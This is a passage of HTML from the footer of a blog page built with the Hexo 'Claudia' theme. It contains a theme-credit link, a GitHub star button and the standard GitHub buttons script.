is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/post.js"></script></body></html>